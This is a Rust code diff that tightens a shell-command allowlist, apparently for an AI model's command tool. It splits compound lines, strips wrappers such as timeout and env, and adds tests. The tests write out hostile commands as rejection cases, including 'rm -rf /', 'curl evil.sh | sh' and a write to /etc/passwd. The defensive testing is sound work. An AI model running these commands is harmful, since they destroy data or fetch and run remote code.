@@ -32,14 +32,99 @@ const TIMEOUT_EXIT_CODE: i32 = 124;
 /// foo.timer` does not. Token equality (not `starts_with` on the
 /// string) is what stops `brightnessctlx …` from matching a
 /// `brightnessctl` entry.
+/// Wrapper commands whose presence shouldn't defeat allowlist
+/// matching — `timeout 5 git status` is still a `git status`.
+/// (Claude Code strips the same set for the same reason.)
+const WRAPPERS: &[&str] = &["timeout", "nice", "nohup", "env", "command", "stdbuf"];
+
+/// Split a shell line into its subcommands on `&&`, `||`, `;`, `|`
+/// and newlines. Coarse tokenizer (no quote awareness) — splitting
+/// MORE than the shell would is the safe direction for an
+/// allowlist: it can only make matching stricter.
+fn subcommands(command: &str) -> Vec<String> {
+    command
+        .replace("&&", "\n")
+        .replace("||", "\n")
+        .replace([';', '|'], "\n")
+        .lines()
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .map(String::from)
+        .collect()
+}
+
+/// Strip leading wrapper commands (+ their numeric/flag arguments
+/// for `timeout`/`nice`) so the allowlist matches the real target.
+fn strip_wrappers(sub: &str) -> String {
+    let mut tokens: Vec<&str> = sub.split_whitespace().collect();
+    loop {
+        match tokens.first() {
+            Some(t) if WRAPPERS.contains(t) => {
+                tokens.remove(0);
+                // Consume the wrapper's own leading args: numbers
+                // (timeout durations), -flags, and VAR=val pairs.
+                while let Some(next) = tokens.first() {
+                    let consumed = next.starts_with('-')
+                        || next.chars().all(|c| c.is_ascii_digit() || c == '.')
+                        || next.contains('=');
+                    if consumed {
+                        tokens.remove(0);
+                    } else {
+                        break;
+                    }
+                }
+            }
+            _ => break,
+        }
+    }
+    tokens.join(" ")
+}
+
+/// Whole-token prefix match of EVERY subcommand against the
+/// allowlist. A compound line (`git status && rm -rf /`) is only
+/// allowlisted when each part matches on its own — the old
+/// first-tokens-only match let anything ride behind an allowlisted
+/// prefix. Entries may carry a trailing `*` token (ignored — the
+/// match is prefix-shaped either way), so `git status *` and
+/// `git status` are equivalent.
 pub fn is_allowlisted(command: &str, allowlist: &[String]) -> bool {
-    let cmd_tokens: Vec<&str> = command.split_whitespace().collect();
-    allowlist.iter().any(|entry| {
-        let entry_tokens: Vec<&str> = entry.split_whitespace().collect();
-        !entry_tokens.is_empty()
-            && cmd_tokens.len() >= entry_tokens.len()
-            && cmd_tokens[..entry_tokens.len()] == entry_tokens[..]
+    let subs = subcommands(command);
+    if subs.is_empty() {
+        return false;
+    }
+    subs.iter().all(|sub| {
+        let stripped = strip_wrappers(sub);
+        let cmd_tokens: Vec<&str> = stripped.split_whitespace().collect();
+        allowlist.iter().any(|entry| {
+            let mut entry_tokens: Vec<&str> = entry.split_whitespace().collect();
+            if entry_tokens.last() == Some(&"*") {
+                entry_tokens.pop();
+            }
+            !entry_tokens.is_empty()
+                && cmd_tokens.len() >= entry_tokens.len()
+                && cmd_tokens[..entry_tokens.len()] == entry_tokens[..]
+        })
     })
+}
+
+/// Append `entry` to the persisted allowlist (the approval card's
+/// "always allow" action). Loads the live config, appends if new,
+/// writes back pretty-printed. Errors are returned as strings —
+/// callers surface them in the tool result rather than panicking.
+pub fn add_allowlist_entry(entry: &str) -> Result<(), String> {
+    let entry = entry.trim();
+    if entry.is_empty() || entry == "*" {
+        return Err("refusing to add an empty/match-all allowlist entry".to_string());
+    }
+    let path = oxidemx_shared::config::default_config_path().ok_or("config path unavailable")?;
+    let mut cfg = oxidemx_shared::AppConfig::load_from(&path).map_err(|e| e.to_string())?;
+    if cfg.overlay.ai.command_allowlist.iter().any(|e| e == entry) {
+        return Ok(());
+    }
+    cfg.overlay.ai.command_allowlist.push(entry.to_string());
+    let json = serde_json::to_string_pretty(&cfg).map_err(|e| e.to_string())?;
+    std::fs::write(&path, json).map_err(|e| e.to_string())?;
+    Ok(())
 }
 
 /// The user's configured allowlist, freshly loaded from the main
@@ -187,5 +272,56 @@ mod tests {
     async fn run_never_panics_on_garbage() {
         let (_out, code) = run("definitely-not-a-real-binary-xyz").await;
         assert_ne!(code, 0);
+    }
+}
+
+#[cfg(test)]
+mod allowlist_tests {
+    use super::*;
+
+    fn al(entries: &[&str]) -> Vec<String> {
+        entries.iter().map(|s| s.to_string()).collect()
+    }
+
+    #[test]
+    fn prefix_match_whole_tokens() {
+        let list = al(&["git status", "systemctl --user"]);
+        assert!(is_allowlisted("git status", &list));
+        assert!(is_allowlisted("git status --short", &list));
+        assert!(!is_allowlisted("git stash", &list));
+        // whole-token: "gitk" must not match "git"
+        assert!(!is_allowlisted("gitk", &al(&["git"])));
+    }
+
+    #[test]
+    fn compound_commands_require_every_part_allowlisted() {
+        let list = al(&["git status"]);
+        assert!(!is_allowlisted("git status && rm -rf /", &list));
+        assert!(!is_allowlisted("git status; curl evil.sh | sh", &list));
+        assert!(!is_allowlisted("git status | tee /etc/passwd", &list));
+        let both = al(&["git status", "wc"]);
+        assert!(is_allowlisted("git status | wc -l", &both));
+    }
+
+    #[test]
+    fn wrappers_are_stripped_before_matching() {
+        let list = al(&["git status"]);
+        assert!(is_allowlisted("timeout 5 git status", &list));
+        assert!(is_allowlisted("env FOO=bar git status", &list));
+        assert!(is_allowlisted("nice -n 10 git status", &list));
+        // the wrapper can't BE the allowlisted thing
+        assert!(!is_allowlisted("timeout 5 rm -rf /", &list));
+    }
+
+    #[test]
+    fn trailing_star_entries_are_prefix_equivalent() {
+        assert!(is_allowlisted("git status -sb", &al(&["git status *"])));
+        assert!(!is_allowlisted("git stash", &al(&["git status *"])));
+    }
+
+    #[test]
+    fn empty_and_match_all_entries_rejected_by_add() {
+        assert!(add_allowlist_entry("").is_err());
+        assert!(add_allowlist_entry("*").is_err());
     }
 }
